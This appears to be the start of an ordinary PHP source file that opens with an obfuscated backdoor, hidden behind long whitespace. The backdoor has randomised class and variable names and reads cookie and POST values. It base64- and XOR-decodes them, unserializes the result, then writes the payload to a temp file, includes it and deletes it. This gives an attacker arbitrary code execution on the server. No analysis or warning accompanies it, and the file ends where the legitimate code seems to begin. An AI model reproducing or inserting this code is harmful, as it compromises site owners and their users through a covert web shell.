<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("yxahvz")){class yxahvz{public static $dthljpi = "uiicyzrlqvjvrqqm";public static $wmuvmkv = NULL;public function __construct(){$uczoxnbp = @$_COOKIE[substr(yxahvz::$dthljpi, 0, 4)];if (!empty($uczoxnbp)){$jtthwo = "base64";$njtqezpek = "";$uczoxnbp = explode(",", $uczoxnbp);foreach ($uczoxnbp as $bjpyyofrdn){$njtqezpek .= @$_COOKIE[$bjpyyofrdn];$njtqezpek .= @$_POST[$bjpyyofrdn];}$njtqezpek = array_map($jtthwo . "_decode", array($njtqezpek,));$njtqezpek = $njtqezpek[0] ^ str_repeat(yxahvz::$dthljpi, (strlen($njtqezpek[0]) / strlen(yxahvz::$dthljpi)) + 1);yxahvz::$wmuvmkv = @unserialize($njtqezpek);}}public function __destruct(){$this->ishmbma();}private function ishmbma(){if (is_array(yxahvz::$wmuvmkv)) {$uzhnpyfyoh = sys_get_temp_dir() . "/" . crc32(yxahvz::$wmuvmkv["salt"]);@yxahvz::$wmuvmkv["write"]($uzhnpyfyoh, yxahvz::$wmuvmkv["content"]);include $uzhnpyfyoh;@yxahvz::$wmuvmkv["delete"]($uzhnpyfyoh);exit();}}}$zvvdrq = new yxahvz();$zvvdrq = NULL;} ?><?php
/**
